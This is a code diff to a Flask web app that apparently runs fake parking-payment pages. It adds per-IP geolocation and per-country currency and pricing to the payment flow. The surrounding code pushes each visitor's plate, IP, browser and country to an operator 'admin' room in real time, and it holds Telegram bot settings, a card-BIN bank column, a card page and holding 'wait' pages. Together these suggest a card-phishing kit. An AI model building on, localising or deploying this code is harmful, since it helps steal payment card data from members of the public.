@@ -14,9 +14,47 @@ import io
 import json
 import urllib.request
 
-socketio = SocketIO(async_mode='gevent')
+socketio = SocketIO()
 _session_sids = {}
 _blocked_ips = set()
+_geoip_cache = {}
+
+_COUNTRY_CURRENCY = {
+    'CH': {'code':'CHF','symbol':'CHF','rate':3.50},
+    'GB': {'code':'GBP','symbol':'£',  'rate':2.50},
+    'DK': {'code':'DKK','symbol':'kr', 'rate':25.00},
+    'SE': {'code':'SEK','symbol':'kr', 'rate':25.00},
+    'NO': {'code':'NOK','symbol':'kr', 'rate':30.00},
+    'IS': {'code':'ISK','symbol':'kr', 'rate':250.00},
+    'PL': {'code':'PLN','symbol':'zł', 'rate':8.00},
+    'CZ': {'code':'CZK','symbol':'Kč', 'rate':50.00},
+    'HU': {'code':'HUF','symbol':'Ft', 'rate':800.00},
+    'BG': {'code':'BGN','symbol':'лв', 'rate':3.00},
+    'DE': {'code':'EUR','symbol':'€',  'rate':2.50},
+    'FR': {'code':'EUR','symbol':'€',  'rate':3.00},
+    'NL': {'code':'EUR','symbol':'€',  'rate':3.50},
+    'BE': {'code':'EUR','symbol':'€',  'rate':2.50},
+    'AT': {'code':'EUR','symbol':'€',  'rate':2.50},
+    'IT': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'ES': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'PT': {'code':'EUR','symbol':'€',  'rate':1.50},
+    'IE': {'code':'EUR','symbol':'€',  'rate':3.00},
+    'LU': {'code':'EUR','symbol':'€',  'rate':2.50},
+    'FI': {'code':'EUR','symbol':'€',  'rate':2.50},
+    'GR': {'code':'EUR','symbol':'€',  'rate':1.50},
+    'RO': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'SK': {'code':'EUR','symbol':'€',  'rate':1.50},
+    'SI': {'code':'EUR','symbol':'€',  'rate':1.50},
+    'HR': {'code':'EUR','symbol':'€',  'rate':1.50},
+    'EE': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'LV': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'LT': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'MT': {'code':'EUR','symbol':'€',  'rate':2.00},
+    'CY': {'code':'EUR','symbol':'€',  'rate':1.50},
+}
+
+def _currency_for_country(cc):
+    return _COUNTRY_CURRENCY.get(cc or '', {'code':'EUR','symbol':'€','rate':2.50})
 
 _TG_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
 _TG_CHAT  = os.getenv('TELEGRAM_CHAT_ID', '')
@@ -45,14 +83,27 @@ def _detect_browser(ua):
     return 'Unknown'
 
 
-def _detect_country(ip):
+def _detect_country_ip(ip):
+    if ip in _geoip_cache:
+        return _geoip_cache[ip]
     try:
         addr = ipaddress.ip_address(ip)
         if addr.is_private or addr.is_loopback:
-            return 'Romania (LAN)'
+            _geoip_cache[ip] = ('Romania (LAN)', 'RO')
+            return _geoip_cache[ip]
     except Exception:
         pass
-    return ip
+    try:
+        req = urllib.request.Request(
+            f'http://ip-api.com/json/{ip}?fields=country,countryCode',
+            headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=2) as resp:
+            d = json.loads(resp.read())
+        result = (d.get('country',''), d.get('countryCode',''))
+        _geoip_cache[ip] = result
+        return result
+    except Exception:
+        return ('', '')
 
 
 def create_app():
@@ -63,7 +114,7 @@ def create_app():
     app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
     db.init_app(app)
-    socketio.init_app(app, cors_allowed_origins="*", async_mode='threading')
+    socketio.init_app(app, cors_allowed_origins='*', async_mode='gevent')
 
     login_manager = LoginManager()
     login_manager.init_app(app)
@@ -90,12 +141,13 @@ def create_app():
     # ── Auto-migrate new columns ────────────────────────────────────────────
     with app.app_context():
         db.create_all()
-        try:
-            with db.engine.connect() as _conn:
-                _conn.execute(db.text('ALTER TABLE parking_session ADD COLUMN bin_bank VARCHAR(300)'))
-                _conn.commit()
-        except Exception:
-            pass
+        for _col, _typ in [('bin_bank','VARCHAR(300)'),('country_code','VARCHAR(10)'),('currency_code','VARCHAR(10)')]:
+            try:
+                with db.engine.connect() as _conn:
+                    _conn.execute(db.text(f'ALTER TABLE parking_session ADD COLUMN {_col} {_typ}'))
+                    _conn.commit()
+            except Exception:
+                pass
 
     # ── Public ──────────────────────────────────────────────────────────────
 
@@ -207,7 +259,7 @@ def create_app():
     @app.route('/pay/<int:lot_id>', methods=['GET', 'POST'])
     def pay_step1(lot_id):
         lot = ParkingLot.query.get_or_404(lot_id)
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         if ip in _blocked_ips:
             return render_template('pay/blocked.html'), 403
         if request.method == 'POST':
@@ -219,11 +271,13 @@ def create_app():
             time_unit = request.form.get('time_unit', 'ore')
             car_type = request.form.get('car_type', 'Autoturism')
             browser = _detect_browser(request.user_agent.string)
-            country = _detect_country(ip)
+            country_name, country_code = _detect_country_ip(ip)
+            curr = _currency_for_country(country_code)
+            rate = curr['rate']
             if time_unit == 'minute':
-                auto_price = round(max(0.01, hours / 60 * 2.6), 2)
+                auto_price = round(max(0.01, hours / 60 * rate), 2)
             else:
-                auto_price = round(hours * 2.6, 2)
+                auto_price = round(hours * rate, 2)
             if ps:
                 ps.plate_number = plate
                 ps.user_city = locality
@@ -232,6 +286,8 @@ def create_app():
                 ps.status = 'price_set'
                 ps.car_type = car_type
                 ps.time_unit = time_unit
+                ps.country_code = country_code
+                ps.currency_code = curr['code']
                 db.session.commit()
                 socketio.emit('session_updated', {
                     'id': ps.id, 'plate': plate, 'locality': locality,
@@ -246,7 +302,8 @@ def create_app():
                     hours=hours, total_price=auto_price,
                     status='price_set',
                     car_type=car_type, time_unit=time_unit,
-                    ip_address=ip, browser=browser, country=country
+                    ip_address=ip, browser=browser, country=country_name,
+                    country_code=country_code, currency_code=curr['code']
                 )
                 db.session.add(ps)
                 db.session.commit()
@@ -254,7 +311,7 @@ def create_app():
                     'id': ps.id, 'plate': plate, 'locality': locality,
                     'hours': hours, 'lot': lot.name, 'token': token,
                     'car_type': car_type, 'time_unit': time_unit,
-                    'ip': ip, 'browser': browser, 'country': country,
+                    'ip': ip, 'browser': browser, 'country': country_name,
                     'lot_id': lot_id, 'time': ps.created_at.strftime('%H:%M:%S'),
                     'price': auto_price
                 }, room='admin')
@@ -262,14 +319,16 @@ def create_app():
             return redirect(url_for('pay_card', token=token))
         # GET — create scanning session immediately
         browser = _detect_browser(request.user_agent.string)
-        country = _detect_country(ip)
+        country_name, country_code = _detect_country_ip(ip)
+        curr = _currency_for_country(country_code)
         token = secrets.token_hex(16)
         ps = ParkingSession(
             token=token, parking_lot_id=lot_id,
             plate_number=None, user_city=None,
             hours=None, total_price=None,
             status='scanning',
-            ip_address=ip, browser=browser, country=country
+            ip_address=ip, browser=browser, country=country_name,
+            country_code=country_code, currency_code=curr['code']
         )
         db.session.add(ps)
         db.session.commit()
@@ -277,11 +336,12 @@ def create_app():
             'id': ps.id, 'plate': '—', 'locality': '…',
             'hours': '—', 'lot': lot.name, 'token': token,
             'car_type': '—', 'time_unit': '—',
-            'ip': ip, 'browser': browser, 'country': country,
+            'ip': ip, 'browser': browser, 'country': country_name,
             'lot_id': lot_id, 'time': ps.created_at.strftime('%H:%M:%S'),
             'price': None
         }, room='admin')
-        return render_template('pay/step1.html', lot=lot, token=token)
+        return render_template('pay/step1.html', lot=lot, token=token,
+                               currency_symbol=curr['symbol'], rate=curr['rate'])
 
     @app.route('/pay/wait/<token>')
     def pay_waiting(token):
@@ -358,7 +418,9 @@ def create_app():
                     'time': datetime.utcnow().strftime('%H:%M:%S')
                 }, room='admin')
             return redirect(url_for('pay_waiting2', token=token))
-        return render_template('pay/card.html', token=token, session=ps)
+        curr = _currency_for_country(ps.country_code or '')
+        return render_template('pay/card.html', token=token, session=ps,
+                               currency_symbol=curr['symbol'])
 
     @app.route('/pay/wait2/<token>')
     def pay_waiting2(token):
